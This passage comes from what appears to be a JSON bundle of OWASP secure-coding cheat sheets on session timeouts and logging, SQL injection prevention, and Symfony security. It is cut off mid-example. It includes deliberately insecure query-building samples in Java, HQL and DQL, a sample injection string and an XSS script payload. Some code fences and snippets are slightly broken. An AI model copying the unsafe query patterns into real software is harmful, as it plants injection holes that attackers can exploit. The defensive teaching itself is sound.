regardless of session activity. This timeout defines the maximum amount of time a session can be active, closing and invalidating the session upon the defined absolute period since the given session was initially created by the web application. After invalidating the session, the user is forced to (re)authenticate again in the web application and establish a new session.\r\n\r\nThe absolute session limits the amount of time an attacker can use a hijacked session and impersonate the victim user.\r\n\r\n#### Renewal Timeout\r\n\r\nAlternatively, the web application can implement an additional renewal timeout after which the session ID is automatically renewed, in the middle of the user session, and independently of the session activity and, therefore, of the idle timeout.\r\n\r\nAfter a specific amount of time since the session was initially created, the web application can regenerate a new ID for the user session and try to set it, or renew it, on the client. The previous session ID value would still be valid for some time, accommodating a safety interval, before the client is aware of the new ID and starts using it. At that time, when the client switches to the new ID inside the current session, the application invalidates the previous ID.\r\n\r\nThis scenario minimizes the amount of time a given session ID value, potentially obtained by an attacker, can be reused to hijack the user session, even when the victim user session is still active. The user session remains alive and open on the legitimate client, although its associated session ID value is transparently renewed periodically during the session duration, every time the renewal timeout expires. Therefore, the renewal timeout complements the idle and absolute timeouts, specially when the absolute timeout value extends significantly over time (e.g. it is an application requirement to keep the user sessions open for long periods of time).\r\n\r\nDepending on the implementation, potentially there could be a race condition where the attacker with a still valid previous session ID sends a request before the victim user, right after the renewal timeout has just expired, and obtains first the value for the renewed session ID. At least in this scenario, the victim user might be aware of the attack as her session will be suddenly terminated because her associated session ID is not valid anymore.\r\n\r\n### Manual Session Expiration\r\n\r\nWeb applications should provide mechanisms that allow security aware users to actively close their session once they have finished using the web application.\r\n\r\n#### Logout Button\r\n\r\nWeb applications must provide a visible and easily accessible logout (logoff, exit, or close session) button that is available on the web application header or menu and reachable from every web application resource and page, so that the user can manually close the session at any time. As described in *Session_Expiration* section, the web application must invalidate the session at least on server side.\r\n\r\n**NOTE**: Unfortunately, not all web applications facilitate users to close their current session. Thus, client-side enhancements allow conscientious users to protect their sessions by helping to close them diligently.\r\n\r\n### Web Content Caching\r\n\r\nEven after the session has been closed, it might be possible to access the private or sensitive data exchanged within the session through the web browser cache. Therefore, web applications must use restrictive cache directives for all the web traffic exchanged through HTTP and HTTPS, such as the [`Cache-Control`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control) and [`Pragma`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Pragma) HTTP headers, and/or equivalent META tags on all or (at least) sensitive web pages.\r\n\r\nIndependently of the cache policy defined by the web application, if caching web application contents is allowed, the session IDs must never be cached, so it is highly recommended to use the `Cache-Control: no-cache=\"Set-Cookie, Set-Cookie2\"` directive, to allow web clients to cache everything except the session ID (see [here](https://stackoverflow.com/a/41352418)).\r\n\r\n## Additional Client-Side Defenses for Session Management\r\n\r\nWeb applications can complement the previously described session management defenses with additional countermeasures on the client side. Client-side protections, typically in the form of JavaScript checks and verifications, are not bullet proof and can easily be defeated by a skilled attacker, but can introduce another layer of defense that has to be bypassed by intruders.\r\n\r\n### Initial Login Timeout\r\n\r\nWeb applications can use JavaScript code in the login page to evaluate and measure the amount of time since the page was loaded and a session ID was granted. If a login attempt is tried after a specific amount of time, the client code can notify the user that the maximum amount of time to log in has passed and reload the login page, hence retrieving a new session ID.\r\n\r\nThis extra protection mechanism tries to force the renewal of the session ID pre-authentication, avoiding scenarios where a previously used (or manually set) session ID is reused by the next victim using the same computer, for example, in session fixation attacks.\r\n\r\n### Force Session Logout On Web Browser Window Close Events\r\n\r\nWeb applications can use JavaScript code to capture all the web browser tab or window close (or even back) events and take the appropriate actions to close the current session before closing the web browser, emulating that the user has manually closed the session via the logout button.\r\n\r\n### Disable Web Browser Cross-Tab Sessions\r\n\r\nWeb applications can use JavaScript code once the user has logged in and a session has been established to force the user to re-authenticate if a new web browser tab or window is opened against the same web application. The web application does not want to allow multiple web browser tabs or windows to share the same session. Therefore, the application tries to force the web browser to not share the same session ID simultaneously between them.\r\n\r\n**NOTE**: This mechanism cannot be implemented if the session ID is exchanged through cookies, as cookies are shared by all web browser tabs/windows.\r\n\r\n### Automatic Client Logout\r\n\r\nJavaScript code can be used by the web application in all (or critical) pages to automatically logout client sessions after the idle timeout expires, for example, by redirecting the user to the logout page (the same resource used by the logout button mentioned previously).\r\n\r\nThe benefit of enhancing the server-side idle timeout functionality with client-side code is that the user can see that the session has finished due to inactivity, or even can be notified in advance that the session is about to expire through a count down timer and warning messages. This user-friendly approach helps to avoid loss of work in web pages that require extensive input data due to server-side silently expired sessions.\r\n\r\n## Session Attacks Detection\r\n\r\n### Session ID Guessing and Brute Force Detection\r\n\r\nIf an attacker tries to guess or brute force a valid session ID, they need to launch multiple sequential requests against the target web application using different session IDs from a single (or set of) IP address(es). Additionally, if an attacker tries to analyze the predictability of the session ID (e.g. using statistical analysis), they need to launch multiple sequential requests from a single (or set of) IP address(es) against the target web application to gather new valid session IDs.\r\n\r\nWeb applications must be able to detect both scenarios based on the number of attempts to gather (or use) different session IDs and alert and/or block the offending IP address(es).\r\n\r\n### Detecting Session ID Anomalies\r\n\r\nWeb applications should focus on detecting anomalies associated to the session ID, such as its manipulation. The OWASP [AppSensor Project](https://owasp.org/www-project-appsensor/) provides a framework and methodology to implement built-in intrusion detection capabilities within web applications focused on the detection of anomalies and unexpected behaviors, in the form of detection points and response actions. Instead of using external protection layers, sometimes the business logic details and advanced intelligence are only available from inside the web application, where it is possible to establish multiple session related detection points, such as when an existing cookie is modified or deleted, a new cookie is added, the session ID from another user is reused, or when the user location or User-Agent changes in the middle of a session.\r\n\r\n### Binding the Session ID to Other User Properties\r\n\r\nWith the goal of detecting (and, in some scenarios, protecting against) user misbehaviors and session hijacking, it is highly recommended to bind the session ID to other user or client properties, such as the client IP address, User-Agent, or client-based digital certificate. If the web application detects any change or anomaly between these different properties in the middle of an established session, this is a very good indicator of session manipulation and hijacking attempts, and this simple fact can be used to alert and/or terminate the suspicious session.\r\n\r\nAlthough these properties cannot be used by web applications to trustingly defend against session attacks, they significantly increase the web application detection (and protection) capabilities. However, a skilled attacker can bypass these controls by reusing the same IP address assigned to the victim user by sharing the same network (very common in NAT environments, like Wi-Fi hotspots) or by using the same outbound web proxy (very common in corporate environments), or by manually modifying his User-Agent to look exactly as the victim users does.\r\n\r\n### Logging Sessions Life Cycle: Monitoring Creation, Usage, and Destruction of Session IDs\r\n\r\nWeb applications should increase their logging capabilities by including information regarding the full life cycle of sessions. In particular, it is recommended to record session related events, such as the creation, renewal, and destruction of session IDs, as well as details about its usage within login and logout operations, privilege level changes within the session, timeout expiration, invalid session activities (when detected), and critical business operations during the session.\r\n\r\nThe log details might include a timestamp, source IP address, web target resource requested (and involved in a session operation), HTTP headers (including the User-Agent and Referer), GET and POST parameters, error codes and messages, username (or user ID), plus the session ID (cookies, URL, GET, POST…).\r\n\r\nSensitive data like the session ID should not be included in the logs in order to protect the session logs against session ID local or remote disclosure or unauthorized access. However, some kind of session-specific information must be logged in order to correlate log entries to specific sessions. It is recommended to log a salted-hash of the session ID instead of the session ID itself in order to allow for session-specific log correlation without exposing the session ID.\r\n\r\nIn particular, web applications must thoroughly protect administrative interfaces that allow to manage all the current active sessions. Frequently these are used by support personnel to solve session related issues, or even general issues, by impersonating the user and looking at the web application as the user does.\r\n\r\nThe session logs become one of the main web application intrusion detection data sources, and can also be used by intrusion protection systems to automatically terminate sessions and/or disable user accounts when (one or many) attacks are detected. If active protections are implemented, these defensive actions must be logged too.\r\n\r\n### Simultaneous Session Logons\r\n\r\nIt is the web application design decision to determine if multiple simultaneous logons from the same user are allowed from the same or from different client IP addresses. If the web application does not want to allow simultaneous session logons, it must take effective actions after each new authentication event, implicitly terminating the previously available session, or asking the user (through the old, new or both sessions) about the session that must remain active.\r\n\r\nIt is recommended for web applications to add user capabilities that allow checking the details of active sessions at any time, monitor and alert the user about concurrent logons, provide user features to remotely terminate sessions manually, and track account activity history (logbook) by recording multiple client details such as IP address, User-Agent, login date and time, idle time, etc.\r\n\r\n## Session Management WAF Protections\r\n\r\nThere are situations where the web application source code is not available or cannot be modified, or when the changes required to implement the multiple security recommendations and best practices detailed above imply a full redesign of the web application architecture, and therefore, cannot be easily implemented in the short term.\r\n\r\nIn these scenarios, or to complement the web application defenses, and with the goal of keeping the web application as secure as possible, it is recommended to use external protections such as Web Application Firewalls (WAFs) that can mitigate the session management threats already described.\r\n\r\nWeb Application Firewalls offer detection and protection capabilities against session based attacks. On the one hand, it is trivial for WAFs to enforce the usage of security attributes on cookies, such as the `Secure` and `HttpOnly` flags, applying basic rewriting rules on the `Set-Cookie` header for all the web application responses that set a new cookie.\r\n\r\nOn the other hand, more advanced capabilities can be implemented to allow the WAF to keep track of sessions, and the corresponding session IDs, and apply all kind of protections against session fixation (by renewing the session ID on the client-side when privilege changes are detected), enforcing sticky sessions (by verifying the relationship between the session ID and other client properties, like the IP address or User-Agent), or managing session expiration (by forcing both the client and the web application to finalize the session).\r\n\r\nThe open-source ModSecurity WAF, plus the OWASP [Core Rule Set](https://owasp.org/www-project-modsecurity-core-rule-set/), provide capabilities to detect and apply security cookie attributes, countermeasures against session fixation attacks, and session tracking features to enforce sticky sessions.\r\n"
    },
    {
      "SQL_Injection_Prevention_Cheat_Sheet.md": "# SQL Injection Prevention Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis cheat sheet will help you prevent SQL injection flaws in your applications. It will define what SQL injection is, explain where those flaws occur, and provide four options for defending against SQL injection attacks. [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) attacks are common because:\r\n\r\n1. SQL Injection vulnerabilities are very common, and\r\n2. The application's database is a frequent target for attackers because it typically contains interesting/critical data.\r\n\r\n## What Is a SQL Injection Attack?\r\n\r\nAttackers can use SQL injection on an application if it has dynamic database queries that use string concatenation and user supplied input. To avoid SQL injection flaws, developers need to:\r\n\r\n1. Stop writing dynamic queries with string concatenation or\r\n2. Prevent malicious SQL input from being included in executed queries.\r\n\r\nThere are simple techniques for preventing SQL injection vulnerabilities and they can be used with practically any kind of programming language and any type of database. While XML databases can have similar problems (e.g., XPath and XQuery injection), these techniques can be used to protect them as well.\r\n\r\n## Anatomy of A Typical SQL Injection Vulnerability\r\n\r\nA common SQL injection flaw in Java is below. Because its unvalidated \"customerName\" parameter is simply appended to the query, an attacker can enter SQL code into that query and the application would take the attacker's code and execute it on the database.\r\n\r\n```java\r\nString query = \"SELECT account_balance FROM user_data WHERE user_name = \"\r\n             + request.getParameter(\"customerName\");\r\ntry {\r\n    Statement statement = connection.createStatement( ... );\r\n    ResultSet results = statement.executeQuery( query );\r\n}\r\n\r\n...\r\n```\r\n\r\n## Primary Defenses\r\n\r\n- **Option 1: Use of Prepared Statements (with Parameterized Queries)**\r\n- **Option 2: Use of Properly Constructed Stored Procedures**\r\n- **Option 3: Allow-list Input Validation**\r\n- **Option 4: STRONGLY DISCOURAGED: Escaping All User Supplied Input**\r\n\r\n### Defense Option 1: Prepared Statements (with Parameterized Queries)\r\n\r\nWhen developers are taught how to write database queries, they should be told to use prepared statements with variable binding (aka parameterized queries). Prepared statements are simple to write and easier to understand than dynamic queries and parameterized queries force the developer to define all SQL code first and pass in each parameter to the query later.\r\n\r\nIf database queries use this coding style, the database will always distinguish between code and data, regardless of what user input is supplied.\r\nAlso, prepared statements ensure that an attacker is not able to change the intent of a query, even if SQL commands are inserted by an attacker.  \r\n\r\n#### Safe Prepared Statement in Java\r\n\r\nIn the safe Java example below, if an attacker were to enter the userID of `tom' or '1'='1`, the parameterized query would look for a username which literally matched the entire string `tom' or '1'='1`. Thus, the database would be protected against injections of malicious SQL code.\r\n\r\nThe following code example uses a `PreparedStatement`, Java's implementation of a parameterized query, to execute the same database query.\r\n\r\n```java\r\n// This should REALLY be validated too\r\nString custname = request.getParameter(\"customerName\");\r\n// Perform input validation to detect attacks\r\nString query = \"SELECT account_balance FROM user_data WHERE user_name = ? \";\r\nPreparedStatement pstmt = connection.prepareStatement( query );\r\npstmt.setString( 1, custname);\r\nResultSet results = pstmt.executeQuery( );\r\n\r\n#### Language-Specific Recommendations for Prepared Statements:\r\n\r\n--Java EE: `PreparedStatement()` with bind variables\r\n--.NET: Parameterized queries like `SqlCommand()` or `OleDbCommand()` with bind variables\r\n--PHP: PDO with strongly typed parameterized queries (using bindParam())\r\n--Hibernate: `createQuery()` with bind variables (called named parameters in Hibernate)\r\n--SQLite: `sqlite3_prepare()` to create a [statement object](http://www.sqlite.org/c3ref/stmt.html)\r\n\r\nOccasionally, prepared statements can harm performance. If this occurs, you should a) strongly validate all data or b) instead of using a prepared statement, escape all user supplied input using an escaping routine specific to your database vendor as described below.\r\n\r\n```\r\n\r\n#### Safe C\\# .NET Prepared Statement\r\n\r\nIn .NET, the creation and execution of the query doesn't change. Just pass the parameters to the query using the `Parameters.Add()` call as shown below.\r\n\r\n```csharp\r\nString query = \"SELECT account_balance FROM user_data WHERE user_name = ?\";\r\ntry {\r\n  OleDbCommand command = new OleDbCommand(query, connection);\r\n  command.Parameters.Add(new OleDbParameter(\"customerName\", CustomerName Name.Text));\r\n  OleDbDataReader reader = command.ExecuteReader();\r\n  // …\r\n} catch (OleDbException se) {\r\n  // error handling\r\n}\r\n```\r\n\r\nWhile we have shown examples in Java and .NET, practically all other languages (including Cold Fusion and Classic ASP) support parameterized query interfaces. Even SQL abstraction layers, like the [Hibernate Query Language](http://hibernate.org/) (HQL) with the same type of injection problems (called [HQL Injection](http://cwe.mitre.org/data/definitions/564.html))  supports parameterized queries as well:\r\n\r\n#### Hibernate Query Language (HQL) Prepared Statement (Named Parameters) Examples\r\n\r\n```java\r\n//First is an unsafe HQL Statement\r\nQuery unsafeHQLQuery = session.createQuery(\"from Inventory where productID='\"+userSuppliedParameter+\"'\");\r\n//Here is a safe version of the same query using named parameters\r\nQuery safeHQLQuery = session.createQuery(\"from Inventory where productID=:productid\");\r\nsafeHQLQuery.setParameter(\"productid\", userSuppliedParameter);\r\n```\r\n\r\n#### Other Examples of Safe Prepared Statements\r\n\r\nIf you need examples of prepared queries/parameterized languages, including Ruby, PHP, Cold Fusion, Perl, and Rust, see the [Query Parameterization Cheat Sheet](Query_Parameterization_Cheat_Sheet.md) or this [site](http://bobby-tables.com/).\r\n\r\nGenerally, developers like prepared statements because all the SQL code stays within the application, which makes your application relatively database independent.\r\n\r\n### Defense Option 2: Stored Procedures\r\n\r\nThough stored procedures are not always safe from SQL injection, developers can use certain standard stored procedure programming constructs. This approach has the same effect as the use of parameterized queries as long as the stored procedures are implemented safely (which is the norm for most stored procedure languages).\r\n\r\n#### Safe Approach to Stored Procedures\r\n\r\nIf stored procedures are needed, the safest approach to using them requires the developer to build SQL statements with parameters that are automatically parameterized, unless the developer does something largely out of the norm. The difference between prepared statements and stored procedures is that the SQL code for a stored procedure is defined and stored in the database itself, and then called from the application. Since prepared statements and safe stored procedures are equally effecitve in preventing SQL injection so your organization should choose which approach makes the most sense for you.\r\n\r\n#### When Stored Procedures Can Increase Risk\r\n\r\nOccasionally, stored procedures can increase risk when a system is attacked. For example, on MS SQL Server, you have three main default roles: `db_datareader`, `db_datawriter` and `db_owner`. Before stored procedures came into use, DBA's would give db_datareader ordb_datawriter rights to the webservice's user, depending on the requirements.\r\n\r\nHowever, stored procedures require execute rights, a role that is not available by default. Some setups where the user management has been centralized, but is limited to those 3 roles, cause all web apps to run under db_owner rights so stored procedures can work. Naturally, that means that if a server is breached the attacker has full rights to the database, where previously they might only have had read-access.\r\n\r\n**Safe Java Stored Procedure Example**:\r\n\r\nThe following code example uses Java's implementation of the stored procedure interface (`CallableStatement`) to execute the same database query. The `sp_getAccountBalance` stored procedure has top be predefined in the database and use the same functionality as the query below.\r\n\r\n```java\r\n// This should REALLY be validated\r\nString custname = request.getParameter(\"customerName\");\r\ntry {\r\n  CallableStatement cs = connection.prepareCall(\"{call sp_getAccountBalance(?)}\");\r\n  cs.setString(1, custname);\r\n  ResultSet results = cs.executeQuery();\r\n  // … result set handling\r\n} catch (SQLException se) {\r\n  // … logging and error handling\r\n}\r\n```\r\n\r\n**Safe VB .NET Stored Procedure Example**:\r\n\r\nThe following code example uses a `SqlCommand`, .NET's implementation of the stored procedure interface, to execute the same database query. The `sp_getAccountBalance` stored procedure must be predefined in the database and use the same functionality as the query defined above.\r\n\r\n```vbnet\r\n Try\r\n   Dim command As SqlCommand = new SqlCommand(\"sp_getAccountBalance\", connection)\r\n   command.CommandType = CommandType.StoredProcedure\r\n   command.Parameters.Add(new SqlParameter(\"@CustomerName\", CustomerName.Text))\r\n   Dim reader As SqlDataReader = command.ExecuteReader()\r\n   '...\r\n Catch se As SqlException\r\n   'error handling\r\n End Try\r\n```\r\n\r\n### Defense Option 3: Allow-list Input Validation\r\n\r\nIf you are faced with parts of SQL queries that can't use bind variables, such as the names of tables or columns as well as the sort order indicator (ASC or DESC), input validation or query redesign is the most appropriate defense. When names of tables or columns are needed, ideally those values come from the code and not from user parameters.\r\n\r\n#### Sample Of Safe Table Name Validation\r\n\r\nWARNING: If user parameter values are used for targeting different table names and column names, this is a symptom of poor design and a full rewrite should be considered if time allows. If that is not possible, developers should map the parameter values to the legal/expected table or column names to make sure unvalidated user input doesn't end up in the query.\r\n\r\nIn the example below, since `tableName` is identified as one of the legal and expected values for a table name in this query, it can be directly appended to the SQL query. Keep in mind that generic table validation functions can lead to data loss as table names are used in queries where they are not expected.\r\n\r\n```text\r\nString tableName;\r\nswitch(PARAM):\r\n  case \"Value1\": tableName = \"fooTable\";\r\n                 break;\r\n  case \"Value2\": tableName = \"barTable\";\r\n                 break;\r\n  ...\r\n  default      : throw new InputValidationException(\"unexpected value provided\"\r\n                                                  + \" for table name\");\r\n```\r\n\r\n#### Safest Use Of Dynamic SQL Generation (DISCOURAGED)\r\n\r\nWhen we say \"implemented safely,\" the stored procedure does not include any unsafe dynamic SQL generation. Developers do not usually generate dynamic SQL inside stored procedures. However, it can be done, but should be avoided.\r\n\r\nIf it can't be avoided, the stored procedure must use input validation or proper escaping as described in this article to make sure that all user supplied input to the stored procedure can't be used to inject SQL code into the dynamically generated query. Auditors should always look for uses of `sp_execute`, `execute` or `exec` within SQL Server stored procedures. Similar audit guidelines are necessary for similar functions for other vendors.\r\n\r\n#### Sample of Safer Dynamic Query Generation (DISCOURAGED)\r\n\r\nFor something simple like a sort order, it would be best if the user supplied input is converted to a boolean, and then that boolean is used to select the safe value to append to the query. This is a very standard need in dynamic query creation.\r\n\r\nFor example:\r\n\r\n```java\r\npublic String someMethod(boolean sortOrder) {\r\n String SQLquery = \"some SQL ... order by Salary \" + (sortOrder ? \"ASC\" : \"DESC\");`\r\n ...\r\n```\r\n\r\nAny time user input can be converted to a non-String, like a date, numeric, boolean, enumerated type, etc. before it is appended to a query, or used to select a value to append to the query, this ensures it is safe to do so.\r\n\r\nInput validation is also recommended as a secondary defense in ALL cases, even when using bind variables as is discussed later in this article. More techniques on how to implement strong input validation is described in the [Input Validation Cheat Sheet](Input_Validation_Cheat_Sheet.md).\r\n\r\n### Defense Option 4: STRONGLY DISCOURAGED: Escaping All User-Supplied Input\r\n\r\nIn this approach, the developer will escape all user input before putting it in a query. It is very database specific in its implementation.  This methodology is frail compared to other defenses and we CANNOT guarantee that this option will prevent all SQL injections in all situations.\r\n\r\nIf an application is built from scratch or it requires low risk tolerance, those cases should be built or re-written using parameterized queries, stored procedures, or some kind of Object Relational Mapper (ORM) that builds your queries for you.\r\n\r\n## Additional Defenses\r\n\r\nBeyond adopting one of the four primary defenses, we also recommend adopting all of these additional defenses in order to provide defense in depth. These additional defenses are:\r\n\r\n- **Least Privilege**\r\n- **Allow-list Input Validation**\r\n\r\n### Least Privilege\r\n\r\nTo minimize the potential damage of a successful SQL injection attack, you should minimize the privileges assigned to every database account in your environment. Start from the ground up to determine what access rights your application accounts require, rather than trying to figure out what access rights you need to take away.\r\n\r\nMake sure that accounts that only need read access are only granted read access to the tables they need access to. DO NOT ASSIGN DBA OR ADMIN TYPE ACCESS TO YOUR APPLICATION ACCOUNTS. We understand that this is easy, and everything just \"works\" when you do it this way, but it is very dangerous.\r\n\r\n#### Minimizing Application and OS Privileges\r\n\r\nSQL injection is not the only threat to your database data. Attackers can simply change the parameter values from one of the legal values they are presented with, to a value that is unauthorized for them, but the application itself might be authorized to access. As such, minimizing the privileges granted to your application will reduce the likelihood of such unauthorized access attempts, even when an attacker is not trying to use SQL injection as part of their exploit.\r\n\r\nWhile you are at it, you should minimize the privileges of the operating system account that the DBMS runs under. Don't run your DBMS as root or system! Most DBMSs run out of the box with a very powerful system account. For example, MySQL runs as system on Windows by default! Change the DBMS's OS account to something more appropriate, with restricted privileges.\r\n\r\n#### Details Of Least Privilege When Developing\r\n\r\nIf an account only needs access to portions of a table, consider creating a view that limits access to that portion of the data and assigning the account access to the view instead, rather than the underlying table. Rarely, if ever, grant create or delete access to database accounts.\r\n\r\nIf you adopt a policy where you use stored procedures everywhere, and don't allow application accounts to directly execute their own queries, then restrict those accounts to only be able to execute the stored procedures they need. Don't grant them any rights directly to the tables in the database.\r\n\r\n#### Least Admin Privileges For Multiple DBs\r\n\r\nThe designers of web applications should avoid using the same owner/admin account in the web applications to connect to the database. Different DB users should be used for different web applications.\r\n\r\nIn general, each separate web application that requires access to the database should have a designated database user account that the application will use to connect to the DB. That way, the designer of the application can have good granularity in the access control, thus reducing the privileges as much as possible. Each DB user will then have select access to what it needs only, and write-access as needed.\r\n\r\nAs an example, a login page requires read access to the username and password fields of a table, but no write access of any form (no insert, update, or delete). However, the sign-up page certainly requires insert privilege to that table; this restriction can only be enforced if these web apps use different DB users to connect to the database.\r\n\r\n#### Enhancing Least Privilege with SQL Views\r\n\r\nYou can use SQL views to further increase the granularity of access by limiting the read access to specific fields of a table or joins of tables. It could have additional benefits.\r\n\r\nFor example, if the system is required (perhaps due to some specific legal requirements) to store the passwords of the users, instead of salted-hashed passwords, the designer could use views to compensate for this limitation. They could revoke all access to the table (from all DB users except the owner/admin) and create a view that outputs the hash of the password field and not the field itself.\r\n\r\nAny SQL injection attack that succeeds in stealing DB information will be restricted to stealing the hash of the passwords (could even be a keyed hash), since no DB user for any of the web applications has access to the table itself.\r\n\r\n### Allow-list Input Validation\r\n\r\nIn addition to being a primary defense when nothing else is possible (e.g., when a bind variable isn't legal), input validation can also be a secondary defense used to detect unauthorized input before it is passed to the SQL query. For more information please see the [Input Validation Cheat Sheet](Input_Validation_Cheat_Sheet.md). Proceed with caution here. Validated data is not necessarily safe to insert into SQL queries via string building.\r\n\r\n## Related Articles\r\n\r\n**SQL Injection Attack Cheat Sheets**:\r\n\r\nThe following articles describe how to exploit different kinds of SQL injection vulnerabilities on various platforms (that this article was created to help you avoid):\r\n\r\n- [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)\r\n- Bypassing WAF's with SQLi - [SQL Injection Bypassing WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)\r\n\r\n**Description of SQL Injection Vulnerabilities**:\r\n\r\n- OWASP article on [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) Vulnerabilities\r\n- OWASP article on [Blind_SQL_Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) Vulnerabilities\r\n\r\n**How to Avoid SQL Injection Vulnerabilities**:\r\n\r\n- [OWASP Developers Guide](https://github.com/OWASP/DevGuide) article on how to avoid SQL injection vulnerabilities\r\n- OWASP Cheat Sheet that provides [numerous language specific examples of parameterized queries using both Prepared Statements and Stored Procedures](Query_Parameterization_Cheat_Sheet.md)\r\n- [The Bobby Tables site (inspired by the XKCD webcomic) has numerous examples in different languages of parameterized Prepared Statements and Stored Procedures](http://bobby-tables.com/)\r\n\r\n**How to Review Code for SQL Injection Vulnerabilities**:\r\n\r\n- [OWASP Code Review Guide](https://wiki.owasp.org/index.php/Category:OWASP_Code_Review_Project) article on how to [Review Code for SQL Injection](https://wiki.owasp.org/index.php/Reviewing_Code_for_SQL_Injection) Vulnerabilities\r\n\r\n**How to Test for SQL Injection Vulnerabilities**:\r\n\r\n- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide) article on how to [Test for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.html) Vulnerabilities\r\n"
    },
    {
      "Symfony_Cheat_Sheet.md": "# Symfony Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis cheat sheet aims to provide developers with security tips when building applications using the Symfony framework.\r\nIt covers common vulnerabilities and best practices to ensure that your Symfony applications are secure.\r\n\r\nWhile Symfony comes with built-in security mechanisms, developers must be aware of potential vulnerabilities and best practices to ensure the applications they build are secure.\r\nThis guide aims to cover common security issues, emphasizing the importance of understanding Symfony's security features and how to utilize them effectively.\r\nWhether you're a newcomer to Symfony or an experienced developer looking to reinforce your security practices, this document serves as a valuable resource.\r\nBy following the guidelines outlined here, you can strengthen the security of your Symfony applications and create a safer digital environment for users and data.\r\n\r\n## Main Sections\r\n\r\n### Cross-Site Scripting (XSS)\r\n\r\nCross-Site Scripting (XSS) is a type of attack where malicious JavaScript code is injected into a displayed variable.\r\nFor example, if the value of the variable name is `<script>alert('hello')</script>`, and we display it in HTML like this: `Hello {{name}}`, the injected script will be executed when the HTML is rendered.\r\n\r\nSymfony comes by default with twig templates that automatically protect applications from XSS attacks by using **output escaping** to transform variables containing special characters by wrapping variable with `{{ }}` statement.\r\n\r\n```twig\r\n<p>Hello {{name}}</p>\r\n{# if 'name' is '<script>alert('hello!')</script>', Twig will output this:\r\n'<p>Hello &lt;script&gt;alert(&#39;hello!&#39;)&lt;/script&gt;</p>' #}\r\n```\r\n\r\nIf you are rendering a variable that is trusted and contains HTML contents, you can use *Twig raw filter* to disable output escaping.\r\n\r\n```twig\r\n<p>{{ product.title|raw }}</p>\r\n{# if 'product.title' is 'Lorem <strong>Ipsum</strong>', Twig will output\r\nexactly that instead of 'Lorem &lt;strong&gt;Ipsum&lt;/strong&gt;' #}\r\n```\r\n\r\nExplore the [Twig output escaping documentation](https://twig.symfony.com/doc/3.x/api.html#escaper-extension) to gain insights into disabling output escaping for a specific block or an entire template.\r\n\r\nFor other information on XSS prevention that is not specific to Symfony, you may refer the [Cross Site Scripting Prevention Cheatsheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md).\r\n\r\n### Cross-Site Request Forgery (CSRF)\r\n\r\nSymfony Form component automatically includes CSRF tokens in the forms, providing built-in protection against CSRF attacks.\r\nSymfony validates these tokens automatically, eliminating the need for manual intervention to safeguard your application.\r\n\r\nBy default the CSRF token is added as a hidden field called `_token`, but this can be customized with other settings on a form-by-form basis:\r\n\r\n```php\r\nuse Symfony\\Component\\Form\\AbstractType;\r\nuse Symfony\\Component\\OptionsResolver\\OptionsResolver;\r\n\r\nclass PostForm extends AbstractType\r\n{\r\n\r\n    public function configureOptions(OptionsResolver $resolver): void\r\n    {\r\n        $resolver->setDefaults([\r\n            // ... \r\n            'csrf_protection' => true,  // enable/disable csrf protection for this form\r\n            'csrf_field_name' => '_csrf_token',\r\n            'csrf_token_id'   => 'post_item', // change arbitrary string used to generate\r\n        ]);\r\n    }\r\n\r\n}\r\n```\r\n\r\nIf you don't use Symfony Forms you can generate and validate CSRF tokens by yourself. To do this you have to install `symfony/security-csrf` component.\r\n\r\n```bash\r\ncomposer install symfony/security-csrf\r\n```\r\n\r\nEnable/disable the CSRF protection in `config/packages/framework.yaml` file:\r\n\r\n```yaml\r\nframework:\r\n    csrf_protection: ~\r\n```\r\n\r\nNext consider this HTML Twig template when CSRF token is generated by `csrf_token()` Twig function\r\n\r\n```twig\r\n<form action=\"{{ url('delete_post', { id: post.id }) }}\" method=\"post\">\r\n    <input type=\"hidden\" name=\"token\" value=\"{{ csrf_token('delete-post') }}\">\r\n    <button type=\"submit\">Delete post</button>\r\n</form>\r\n```\r\n\r\nThen you can get value of CSRF token in controller using `isCsrfTokenValid()` function:\r\n\r\n```php\r\nuse App\\Entity\\Post;\r\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\r\nuse Symfony\\Component\\HttpFoundation\\Request;\r\nuse Symfony\\Component\\HttpFoundation\\Response;\r\nuse Symfony\\Component\\Routing\\Annotation\\Route;\r\n\r\nclass ExampleController extends AbstractController\r\n{\r\n\r\n    #[Route('/posts/{id}', methods: ['DELETE'], name: 'delete_post')]\r\n    public function delete(Post $post, Request $request): Response \r\n    { \r\n        $token = $request->request->get('token')\r\n        if($this->isCsrfTokenValid($token)) {\r\n            // ...\r\n        }\r\n        \r\n        // ...\r\n    }\r\n}\r\n```\r\n\r\nYou can find more information about CSRF not related to Symfony in [Cross-Site Request Forgery (CSRF) Cheat Sheet](Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md).\r\n\r\n### SQL Injection\r\n\r\nSQL Injection is a type of security vulnerability that occurs when an attacker is able to manipulate a SQL query in a way that it can execute arbitrary SQL code.\r\nThis can allow attackers to view, modify, or delete data in the database, potentially leading to unauthorized access or data loss.\r\n\r\nSymfony, particularly when used with Doctrine ORM (Object-Relational Mapping), provides protection against SQL injection through prepared statements parameters.\r\nThanks to this it is harder to mistakenly write unprotected queries, however it is still possible.\r\nThe following example shows **insecure DQL usage**:\r\n\r\n```php\r\nuse Doctrine\\ORM\\EntityManagerInterface;\r\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\r\nuse Symfony\\Component\\HttpFoundation\\Request;\r\nuse Symfony\\Component\\HttpFoundation\\Response;\r\n\r\nclass ExampleController extends AbstractController {\r\n    \r\n    public function getPost(Request $request, EntityManagerInterface $em): Response\r\n    {\r\n        $id = $request->query->get('id');\r\n\r\n        $dql = \"SELECT p FROM App\\Entity\\Post p WHERE p.id = \" . $id . \";\";\r\n        $query = $em->createQuery($dql);\r\n        $post = $query->getSingleResult();\r\n\r\n        // 